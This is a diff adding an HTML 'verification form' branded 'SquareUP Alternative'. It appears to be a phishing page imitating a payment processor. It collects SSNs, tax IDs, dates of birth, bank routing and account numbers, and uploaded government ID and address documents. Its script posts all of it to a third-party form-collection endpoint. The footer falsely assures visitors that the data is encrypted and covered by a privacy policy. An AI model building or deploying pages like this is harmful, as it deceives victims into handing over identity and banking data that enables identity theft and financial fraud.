@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SquareUP Alternative Verification</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f7f8fa;
+            color: #333;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #2a3f5f;
+            font-weight: 700;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .logo p {
+            color: #6b7280;
+            font-size: 16px;
+        }
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        
+        .form-title h2 {
+            color: #2a3f5f;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .form-title p {
+            color: #6b7280;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #374151;
+            font-size: 14px;
+        }
+        
+        .required {
+            color: #ef4444;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .form-row .form-group {
+            flex: 1;
+        }
+        
+        .help-text {
+            font-size: 12px;
+            color: #6b7280;
+            margin-top: 5px;
+        }
+        
+        .file-upload {
+            position: relative;
+            display: inline-block;
+            cursor: pointer;
+            width: 100%;
+        }
+        
+        .file-upload input[type=file] {
+            position: absolute;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+        
+        .file-upload-label {
+            display: block;
+            padding: 12px;
+            border: 1px dashed #d1d5db;
+            border-radius: 6px;
+            text-align: center;
+            background-color: #f9fafb;
+            transition: all 0.3s;
+        }
+        
+        .file-upload:hover .file-upload-label {
+            background-color: #f3f4f6;
+            border-color: #9ca3af;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+        }
+        
+        .checkbox-group label {
+            font-weight: normal;
+            margin-bottom: 0;
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 14px 24px;
+            background-color: #4f46e5;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+        
+        .btn:hover {
+            background-color: #4338ca;
+        }
+        
+        .btn:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+        
+        .form-footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e7eb;
+            font-size: 14px;
+            color: #6b7280;
+        }
+        
+        .status-message {
+            padding: 12px;
+            margin-top: 20px;
+            border-radius: 6px;
+            display: none;
+        }
+        
+        .success {
+            background-color: #d1fae5;
+            color: #065f46;
+            border: 1px solid #a7f3d0;
+        }
+        
+        .error {
+            background-color: #fee2e2;
+            color: #991b1b;
+            border: 1px solid #fecaca;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>SquareUP Alternative</h1>
+            <p>Secure Payment Processing Solutions</p>
+        </div>
+        
+        <div class="form-title">
+            <h2>Verification Form</h2>
+            <p>Please complete all required fields to verify your account</p>
+        </div>
+        
+        <form id="verificationForm" action="https://getform.io/f/bk29xadohs8" method="POST" enctype="multipart/form-data">
+            <!-- Business Information -->
+            <div class="form-group">
+                <h3 style="margin-bottom: 15px; color: #2a3f5f;">Business Information</h3>
+            </div>
+            
+            <div class="form-group">
+                <label for="businessName">Legal Business Name <span class="required">*</span></label>
+                <input type="text" id="businessName" name="businessName" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="dbaName">Doing Business As (DBA) <span class="required">*</span></label>
+                <input type="text" id="dbaName" name="dbaName" class="form-control" required>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="businessType">Business Type <span class="required">*</span></label>
+                    <select id="businessType" name="businessType" class="form-control" required>
+                        <option value="">Select Business Type</option>
+                        <option value="sole-proprietorship">Sole Proprietorship</option>
+                        <option value="llc">Limited Liability Company (LLC)</option>
+                        <option value="corporation">Corporation</option>
+                        <option value="partnership">Partnership</option>
+                        <option value="non-profit">Non-Profit</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label for="industry">Industry <span class="required">*</span></label>
+                    <select id="industry" name="industry" class="form-control" required>
+                        <option value="">Select Industry</option>
+                        <option value="retail">Retail</option>
+                        <option value="restaurant">Restaurant</option>
+                        <option value="services">Professional Services</option>
+                        <option value="ecommerce">E-commerce</option>
+                        <option value="healthcare">Healthcare</option>
+                        <option value="education">Education</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="businessDescription">Business Description <span class="required">*</span></label>
+                <textarea id="businessDescription" name="businessDescription" rows="3" class="form-control" required></textarea>
+                <div class="help-text">Briefly describe what products or services your business provides</div>
+            </div>
+            
+            <!-- Business Address -->
+            <div class="form-group">
+                <h3 style="margin-bottom: 15px; color: #2a3f5f;">Business Address</h3>
+            </div>
+            
+            <div class="form-group">
+                <label for="address">Street Address <span class="required">*</span></label>
+                <input type="text" id="address" name="address" class="form-control" required>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="city">City <span class="required">*</span></label>
+                    <input type="text" id="city" name="city" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="state">State/Province <span class="required">*</span></label>
+                    <input type="text" id="state" name="state" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="zipCode">ZIP/Postal Code <span class="required">*</span></label>
+                    <input type="text" id="zipCode" name="zipCode" class="form-control" required>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="country">Country <span class="required">*</span></label>
+                <select id="country" name="country" class="form-control" required>
+                    <option value="">Select Country</option>
+                    <option value="US">United States</option>
+                    <option value="CA">Canada</option>
+                    <option value="UK">United Kingdom</option>
+                    <option value="AU">Australia</option>
+                    <option value="other">Other</option>
+                </select>
+            </div>
+            
+            <!-- Contact Information -->
+            <div class="form-group">
+                <h3 style="margin-bottom: 15px; color: #2a3f5f;">Contact Information</h3>
+            </div>
+            
+            <div class="form-group">
+                <label for="firstName">First Name <span class="required">*</span></label>
+                <input type="text" id="firstName" name="firstName" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="lastName">Last Name <span class="required">*</span></label>
+                <input type="text" id="lastName" name="lastName" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Email Address <span class="required">*</span></label>
+                <input type="email" id="email" name="email" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">Phone Number <span class="required">*</span></label>
+                <input type="tel" id="phone" name="phone" class="form-control" required>
+                <div class="help-text">Include country code (e.g., +1 for US)</div>
+            </div>
+            
+            <!-- Identity Verification -->
+            <div class="form-group">
+                <h3 style="margin-bottom: 15px; color: #2a3f5f;">Identity Verification</h3>
+            </div>
+            
+            <div class="form-group">
+                <label for="taxId">Tax ID / EIN <span class="required">*</span></label>
+                <input type="text" id="taxId" name="taxId" class="form-control" required>
+                <div class="help-text">Employer Identification Number (EIN) for businesses, or Social Security Number (SSN) for sole proprietors</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="ssn4">Last 4 digits of SSN <span class="required">*</span></label>
+                <input type="text" id="ssn4" name="ssn4" class="form-control" maxlength="4" pattern="[0-9]{4}" required>
+                <div class="help-text">For identity verification purposes only</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="dob">Date of Birth <span class="required">*</span></label>
+                <input type="date" id="dob" name="dob" class="form-control" required>
+            </div>
+            
+            <!-- Document Uploads -->
+            <div class="form-group">
+                <h3 style="margin-bottom: 15px; color: #2a3f5f;">Document Uploads</h3>
+            </div>
+            
+            <div class="form-group">
+                <label>Proof of Address <span class="required">*</span></label>
+                <div class="file-upload">
+                    <input type="file" id="proofOfAddress" name="proofOfAddress" required>
+                    <label for="proofOfAddress" class="file-upload-label">
+                        <div id="proofOfAddressText">Choose file or drag and drop</div>
+                    </label>
+                </div>
+                <div class="help-text">Upload a recent utility bill, bank statement, or government correspondence (PDF, JPG, or PNG)</div>
+            </div>
+            
+            <div class="form-group">
+                <label>Business Registration Document <span class="required">*</span></label>
+                <div class="file-upload">
+                    <input type="file" id="businessRegistration" name="businessRegistration" required>
+                    <label for="businessRegistration" class="file-upload-label">
+                        <div id="businessRegistrationText">Choose file or drag and drop</div>
+                    </label>
+                </div>
+                <div class="help-text">Articles of incorporation, business license, or partnership agreement</div>
+            </div>
+            
+            <div class="form-group">
+                <label>Government Issued ID <span class="required">*</span></label>
+                <div class="file-upload">
+                    <input type="file" id="governmentId" name="governmentId" required>
+                    <label for="governmentId" class="file-upload-label">
+                        <div id="governmentIdText">Choose file or drag and drop</div>
+                    </label>
+                </div>
+                <div class="help-text">Driver's license, passport, or national ID card</div>
+            </div>
+            
+            <!-- Bank Information -->
+            <div class="form-group">
+                <h3 style="margin-bottom: 15px; color: #2a3f5f;">Bank Information</h3>
+            </div>
+            
+            <div class="form-group">
+                <label for="bankName">Bank Name <span class="required">*</span></label>
+                <input type="text" id="bankName" name="bankName" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="accountName">Account Holder Name <span class="required">*</span></label>
+                <input type="text" id="accountName" name="accountName" class="form-control" required>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="routingNumber">Routing Number <span class="required">*</span></label>
+                    <input type="text" id="routingNumber" name="routingNumber" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="accountNumber">Account Number <span class="required">*</span></label>
+                    <input type="text" id="accountNumber" name="accountNumber" class="form-control" required>
+                </div>
+            </div>
+            
+            <!-- Terms and Conditions -->
+            <div class="form-group">
+                <h3 style="margin-bottom: 15px; color: #2a3f5f;">Terms and Conditions</h3>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="terms" name="terms" required>
+                <label for="terms">I agree to the Terms of Service and Privacy Policy <span class="required">*</span></label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="authorized" name="authorized" required>
+                <label for="authorized">I certify that I am authorized to sign up on behalf of this business <span class="required">*</span></label>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="accurate" name="accurate" required>
+                <label for="accurate">I certify that all information provided is accurate and truthful <span class="required">*</span></label>
+            </div>
+            
+            <button type="submit" id="submitBtn" class="btn">Submit Verification</button>
+            
+            <div id="statusMessage" class="status-message"></div>
+        </form>
+        
+        <div class="form-footer">
+            <p>This information is encrypted and securely transmitted. Your data is protected in accordance with our Privacy Policy.</p>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('verificationForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            // File upload label updates
+            const fileInputs = [
+                { input: 'proofOfAddress', label: 'proofOfAddressText' },
+                { input: 'businessRegistration', label: 'businessRegistrationText' },
+                { input: 'governmentId', label: 'governmentIdText' }
+            ];
+            
+            fileInputs.forEach(file => {
+                const input = document.getElementById(file.input);
+                const label = document.getElementById(file.label);
+                
+                input.addEventListener('change', function() {
+                    if (this.files && this.files[0]) {
+                        label.textContent = this.files[0].name;
+                    } else {
+                        label.textContent = 'Choose file or drag and drop';
+                    }
+                });
+            });
+            
+            // Form submission
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Disable submit button and show loading
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="loading"></span>Processing...';
+                
+                // Create form data
+                const formData = new FormData(form);
+                
+                // Submit to GetForm
+                fetch('https://getform.io/f/bk29xadohs8', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Show success message
+                        statusMessage.textContent = 'Your verification form has been submitted successfully. We will review your information and contact you within 3-5 business days.';
+                        statusMessage.className = 'status-message success';
+                        statusMessage.style.display = 'block';
+                        
+                        // Reset form
+                        form.reset();
+                        
+                        // Reset file upload labels
+                        fileInputs.forEach(file => {
+                            document.getElementById(file.label).textContent = 'Choose file or drag and drop';
+                        });
+                    } else {
+                        throw new Error('Form submission failed');
+                    }
+                })
+                .catch(error => {
+                    // Show error message
+                    statusMessage.textContent = 'There was an error submitting your form. Please try again or contact support if the problem persists.';
+                    statusMessage.className = 'status-message error';
+                    statusMessage.style.display = 'block';
+                    console.error('Error:', error);
+                })
+                .finally(() => {
+                    // Re-enable submit button
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Submit Verification';
+                    
+                    // Scroll to status message
+                    statusMessage.scrollIntoView({ behavior: 'smooth' });
+                });
+            });
+        });
+    </script>
+</body>
+</html>
